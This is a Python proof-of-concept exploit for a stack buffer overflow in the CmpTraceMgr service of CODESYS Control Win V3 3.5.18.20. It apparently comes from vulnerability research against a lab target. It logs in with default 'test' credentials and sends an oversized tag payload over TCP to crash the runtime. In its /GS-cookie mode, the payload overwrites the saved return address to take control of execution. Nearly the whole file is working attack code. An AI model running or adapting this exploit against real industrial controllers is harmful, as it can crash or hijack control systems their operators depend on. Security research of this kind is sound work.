#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CmpTraceMgr stack-overflow PoC over TCP — CODESYS Control Win V3 3.5.18.20.

Same vulnerability, same payload builders, same frame offsets as trace_poc.py;
only the carrier changes.  The bug, the /GS analysis and the cookie-aware
payload are documented there — this file repeats the parts a TCP run needs and
otherwise points at it.

Vulnerability (recap)
---------------------
`TraceMgrServiceHandler` (CmpTraceMgr, service group 0x000F / service 0x0002)
hands several tag payloads to `memcpy` with the *attacker-supplied* tag length
and a small stack buffer as destination — the tag parse only proves the bytes
are present in the body, never that they fit.

    top level       tag 19 (0x13)  ->  memcpy(v26, src, len)   v26[4]   @ ebp-0xBC0
                    tag 20 (0x14)  ->  memcpy(v27, src, len)   v27[4]   @ ebp-0xBBC
                    tag 21 (0x15)  ->  memcpy(v28, src, len)   v28[20]  @ ebp-0xBB8
    in container    tag 48 (0x30)  ->  memcpy(v34, src, len)   v34[8]   @ ebp-0x1C
    0x86 (134)      tag 51 (0x33)  ->  memcpy(&v35, src, len)  v35(u32) @ ebp-0x14

Distances to the saved return address, the /GS cookie at [ebp-4], and why a
plain 'A' fill dies in `__security_check_cookie` (int 0x29) instead of reaching
`ret`: see trace_poc.py.  `--security-cookie`/`--frame-ebp` splice the correct
`cookie XOR ebp` slot in and get EIP = 0x41414141.

Transport: what TCP buys
------------------------
trace_poc.py carries the request over CmpBlkDrvUdp, whose receive path caps a
*services* block at roughly 472 bytes: a larger one is dropped silently, and a
fragmented (blk_first + blk_cont) request is answered with a 0x84 channel
close.  That cap is the whole reason that PoC defaults to the nested tag-48
trigger — a 47-byte body — instead of the article's full-size one.

CmpBlkDrvTcp has no such per-port policy.  A datagram is still limited to 512
bytes (the block driver rejects a length outside 6..512 before the router ever
sees it), but the channel layer reassembles continuation frames normally, so
codesys_tcp.py splits an oversized services block across as many BLK frames as
it takes and the runtime answers.  That removes the transport ceiling the UDP
PoC ran into: the article's 0x18AC (6316-byte) tag-19 body, which could not be
delivered over UDP from a non-Gateway port at all, is sendable here as ~14
frames against 2 for the nested trigger.

What that buys in practice is untested at the crash site.  A 6316-byte fill
does not just pass under the cookie, it flattens everything between ebp-0xBC0
and ebp-0x040 — including the tag-reader struct `v30` at ebp-0x538 that the
handler is still iterating with.  Whether the handler reaches the `memcpy`
before the corrupted reader derails it is a question for the breakpoint, not
for arithmetic, so treat the large top-level triggers as "now deliverable"
rather than "now proven".  The nested tag-48 trigger remains the shortest path
to a controlled write.

Usage
    python poc_tcp.py 192.168.125.129                  # nested tag 48, 64 A's
    python poc_tcp.py 192.168.125.129 --tag 51         # 24 bytes to EIP
    python poc_tcp.py 192.168.125.129 --tag 19 --length 0x18AC   # now deliverable
    python poc_tcp.py 192.168.125.129 --dry-run

The runtime is expected to *not* answer — the overwritten cookie kills it.  Over
TCP that shows up as a connection reset rather than a timeout, which is a
cleaner death signal than UDP gives.  Confirm the root cause in x64dbg at
0x00A88833 (tag 48) or 0x00A8871B (tag 19): the breakpoint hits, the destination
reads all `0x41`, and the run leaves via `__security_check_cookie` -> `int 0x29`.
"""

import argparse
import socket
import struct
import sys

from codesys_tcp import (
    CodesysTcpClient, GRP_TRACE, TRACE_CONFIGURE, STATUS_OK, TCP_PORT, tag,
    parent_tag, parse_tags, dump_tags, status_of, build_ack,
)

#: trigger tag -> (container to nest in, frame offset of the destination,
#:                 description, bytes to the saved return address)
TRIGGERS = {
    48: (0x86, 0xBE4, "memcpy(v34, src, len)   v34[8]  @ ebp-0x1C", 32),
    51: (0x86, 0xBEC, "memcpy(&v35, src, len)  v35 u32 @ ebp-0x14", 24),
    19: (None, 0x040, "memcpy(v26, src, len)   v26[4]  @ ebp-0xBC0", 3012),
    20: (None, 0x044, "memcpy(v27, src, len)   v27[4]  @ ebp-0xBBC", 3008),
    21: (None, 0x048, "memcpy(v28, src, len)   v28[20] @ ebp-0xBB8", 3004),
}

#: frame offset of the /GS stack cookie (`var_4`); the epilogue does
#: `mov ecx,[ebp-4] / xor ecx,ebp / call __security_check_cookie`, so the slot
#: must hold `___security_cookie XOR <ebp at return>`.
COOKIE_OFF = 0xBFC
#: frame offset of the saved return address
RET_OFF = 0xC04

DEFAULT_TAG = 48
DEFAULT_LENGTH = 64

#: what one BLK frame can carry, straight from the client's fragmentation math
FRAME_DATA_FIRST = CodesysTcpClient.MAX_FRAME_DATA_FIRST     # 468
FRAME_DATA_CONT = CodesysTcpClient.MAX_FRAME_DATA_CONT       # 476


def frame_count(services_len):
    """How many BLK frames codesys_tcp.py will split this block into."""
    if services_len <= FRAME_DATA_FIRST:
        return 1
    rest = services_len - FRAME_DATA_FIRST
    return 1 + -(-rest // FRAME_DATA_CONT)


def build_body(tag_id, length, fill=b"A"):
    """Wrap `length` bytes of filler in the trigger tag.

    Tag 48/51 live inside container 0x86 — the shape a real TRACE_CONFIGURE
    body uses.  `parent_tag` supplies the container header; `tag()` writes the
    length as the 3-byte padded LEB128 the runtime itself emits (64 -> `c0 80
    00`), which parses identically to a minimal encoding.
    """
    inner = tag(tag_id, fill * length)
    container = TRIGGERS[tag_id][0]
    return parent_tag(container, inner) if container else inner


def build_cookie_body(tag_id, cookie, ebp, ret=0x41414141, length=None):
    """Payload that survives the /GS check and hijacks the return address.

    Layout, relative to the memcpy destination:
        [0 .. COOKIE_OFF-dest)      filler
        [COOKIE_OFF-dest .. +4)     cookie XOR ebp   <- what the epilogue wants
        [+4 .. +8)                  saved EBP       (popped, value irrelevant)
        [RET_OFF-dest .. +4)        return address

    `cookie` is the `___security_cookie` global and `ebp` the frame base at the
    check; both are readable in x64dbg, and `ebp` is stable per process for this
    call path (two different requests hit the same memcpy with an identical
    ebp), so a recon request plus an exploit request agree.
    """
    dest = TRIGGERS[tag_id][1]
    filler = COOKIE_OFF - dest
    slot = (cookie ^ ebp) & 0xFFFFFFFF
    ret_at = RET_OFF - dest
    payload = bytearray(b"A" * filler)
    payload += struct.pack("<I", slot)
    payload += struct.pack("<I", 0x41414141)          # saved EBP
    if len(payload) < ret_at:
        payload += b"A" * (ret_at - len(payload))
    assert len(payload) == ret_at, (len(payload), ret_at)
    payload += struct.pack("<I", ret)
    if length is not None:
        if length < len(payload):
            raise SystemExit(f"length {length} < {len(payload)} needed")
        payload += b"A" * (length - len(payload))
    inner = tag(tag_id, bytes(payload))
    container = TRIGGERS[tag_id][0]
    return parent_tag(container, inner) if container else inner


def quiesce(c):
    """ACK the last response and drain anything still queued on the stream.

    The UDP PoC needs this because an unacknowledged single-frame reply is
    retransmitted, and the PoC's `call()` would read that stale reply and report
    "the runtime answered" even though the process is gone.  TCP has no such
    retransmit, so here it is belt-and-braces: it ACKs the final block for
    protocol hygiene and empties the socket so the PoC observes only what its
    own request provokes.

    Draining stops at the first timeout, which `recv_raw` takes on the 8-byte
    block-driver header — so a quiet socket costs one timeout and consumes
    nothing, and a pending frame is read whole rather than half.

    ValueError is caught alongside the socket errors because the TCP `recv_raw`
    raises it on a bad magic or an implausible length, where the UDP one just
    returns None.  Letting that escape would abort the PoC over a stray byte.
    """
    if c.rx_blk:
        c.send_raw(build_ack(c.channel_id, c.token, c.rx_blk))
    dropped = 0
    while True:
        try:
            c.recv_raw(timeout=0.5)
            dropped += 1
        except (TimeoutError, socket.timeout, OSError, ValueError):
            return dropped


def main():
    ap = argparse.ArgumentParser(
        description="CmpTraceMgr (0x000F/0x0002) memcpy stack-overflow PoC "
                    "over TCP",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("target", help="runtime IPv4 address, e.g. 192.168.125.129")
    ap.add_argument("--port", type=int, default=TCP_PORT,
                    help=f"TCP port; {TCP_PORT} is CmpBlkDrvTcp in the runtime")
    ap.add_argument("--user", default="test")
    ap.add_argument("--password", default="test")
    ap.add_argument("--app-name", default="App")
    ap.add_argument("--timeout", type=float, default=5.0)
    ap.add_argument("--tag", type=int, default=DEFAULT_TAG,
                    choices=sorted(TRIGGERS),
                    help=f"vulnerable tag id (default {DEFAULT_TAG})")
    ap.add_argument("--length", type=lambda s: int(s, 0), default=None,
                    help="filler length in bytes "
                         f"(default {DEFAULT_LENGTH}, or 4 past the EIP offset "
                         "for the chosen tag)")
    ap.add_argument("--security-cookie", type=lambda s: int(s, 0), default=None,
                    metavar="HEX",
                    help="value of the ___security_cookie global (x64dbg: "
                         "dump at 0x00F9B264).  With --frame-ebp, builds a "
                         "payload that survives the /GS check")
    ap.add_argument("--frame-ebp", type=lambda s: int(s, 0), default=None,
                    metavar="HEX",
                    help="ebp of the TraceMgrServiceHandler frame at the "
                         "memcpy (read it at the breakpoint).  Needed alongside "
                         "--security-cookie")
    ap.add_argument("--ret", type=lambda s: int(s, 0), default=0x41414141,
                    metavar="HEX",
                    help="return address to plant (default 0x41414141)")
    ap.add_argument("--dry-run", action="store_true",
                    help="build and print the request, do not send")
    args = ap.parse_args()

    container, dest_off, what, to_eip = TRIGGERS[args.tag]
    if (args.security_cookie is None) != (args.frame_ebp is None):
        ap.error("--security-cookie and --frame-ebp must be given together")

    cookie_mode = args.security_cookie is not None
    length = args.length if args.length is not None else max(DEFAULT_LENGTH,
                                                             to_eip + 4)
    if cookie_mode:
        body = build_cookie_body(args.tag, args.security_cookie, args.frame_ebp,
                                 args.ret, length)
    else:
        body = build_body(args.tag, length)
    services_len = len(body) + 20

    print("========== CmpTraceMgr stack overflow PoC (TCP) ==========")
    print(f"  service : group 0x{GRP_TRACE:04X} / service 0x{TRACE_CONFIGURE:04X}"
          f"  (the article's TraceMgrSrvPacketCreate; the only id reaching"
          f" TraceMgrServiceHandler)")
    print(f"  trigger : tag {args.tag}"
          + (f" nested in container 0x{container:02x}" if container else "")
          + f"  ->  {what}")
    print(f"  offset  : {to_eip} bytes from the destination to the saved EIP")
    if cookie_mode:
        slot = (args.security_cookie ^ args.frame_ebp) & 0xFFFFFFFF
        print(f"  /GS     : cookie 0x{args.security_cookie:08x} ^ ebp "
              f"0x{args.frame_ebp:08x} -> slot 0x{slot:08x} "
              f"at [ebp-4] (payload +{COOKIE_OFF - dest_off})")
        print(f"  ret     : 0x{args.ret:08x}")
    print(f"  payload : {length} bytes "
          + ("with the /GS slot spliced in" if cookie_mode else f"of {b'A'!r}")
          + f", body {len(body)}B, services {services_len}B")
    if not cookie_mode and length <= to_eip:
        print(f"  [!] {length} <= {to_eip}: this will NOT reach the return "
              f"address")
    if not cookie_mode:
        print("  [i] plain 'A' fill smashes the /GS cookie at [ebp-4] first, so"
              " this dies in\n      __security_check_cookie (int 0x29) instead of"
              " reaching `ret`.  Add\n      --security-cookie/--frame-ebp to"
              " splice the correct slot in.")
    frames = frame_count(services_len)
    if frames > 1:
        print(f"  [i] services block exceeds one {FRAME_DATA_FIRST}B frame; "
              f"codesys_tcp.py splits it\n      into {frames} BLK frames.  Under "
              f"UDP this body could not be delivered at all.")
    if args.dry_run:
        print(f"\n  body ({len(body)}B):\n    {body[:64].hex(' ')}"
              + (" ..." if len(body) > 64 else ""))
        return 0

    # ---- handshake: channel -> session -> challenge -> login -> app login ----
    c = CodesysTcpClient(args.target, args.port, args.timeout, verbose=True)
    try:
        c.open_channel()
        c.create_session()
        pem, challenge = c.get_public_key()
        status, _ = c.login(pem, challenge, args.user, args.password)
        if status != STATUS_OK:
            print(f"[-] device login failed (status={status}); the runtime will "
                  f"reject the trace request")
            return 1
        c.app_login(args.app_name)
    except Exception as e:
        print(f"\n[-] handshake failed: {e}")
        c.close()
        return 1

    # ---- fire ----
    print("\n========== sending PoC ==========")
    c.verbose = False                     # a multi-KB hex dump helps nobody
    print(f"  quiesced ({quiesce(c)} stale datagram(s) dropped)")
    try:
        hdr, resp = c.call(GRP_TRACE, TRACE_CONFIGURE, body)
    except (TimeoutError, socket.timeout):
        print("[+] no response to the PoC request (the runtime is still there "
              "but never answered).")
    except OSError as e:
        print(f"[+] connection dropped during the PoC: {e}\n"
              "    A reset is what a dead process looks like from here.")
    except ValueError as e:
        print(f"[-] the runtime answered, but the reply did not parse: {e}\n"
              "    That is not a clean crash — inspect it before trusting the "
              "run.")
        c.close()
        return 1
    else:
        print(f"[-] the runtime answered: group=0x{hdr['group']:04x} "
              f"service=0x{hdr['service_id']:04x} {len(resp)}B status="
              f"{status_of(parse_tags(resp))} — it did not crash.")
        dump_tags(parse_tags(resp))
        print("    Check the tag id, the payload length and that this build is "
              "really 3.5.18.20.")
        c.close()
        return 1

    print("\n========== RESULT ==========")
    print(f"  Sent {len(body)}B body (tag {args.tag}, {length} x 'A') in "
          f"{frames} frame(s) to channel 0x{c.channel_id:08x} / "
          f"session 0x{c.session_id:08x}.")
    print("  No reply — which is what a dead process looks like from here.")
    print("  Confirm in x64dbg:")
    print(f"    - breakpoint 0x00A88833 (tag 48) / 0x00A8871B (tag 19) hits")
    print(f"    - the destination is [ebp-{'1C' if args.tag in (48, 51) else 'BC0'}"
          f"] and the size argument is {length}")
    print("    - after the copy, [ebp+4] (the return address) reads 0x41414141")
    print("    - the run then leaves via __security_check_cookie -> int 0x29")
    print("      (ECX=2, FAST_FAIL_STACK_COOKIE_CHECK_FAILURE): the /GS cookie at")
    print("      [ebp-4] is below the return address, so it is always smothered")
    print("      first.  EIP control needs the cookie leaked and rewritten.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
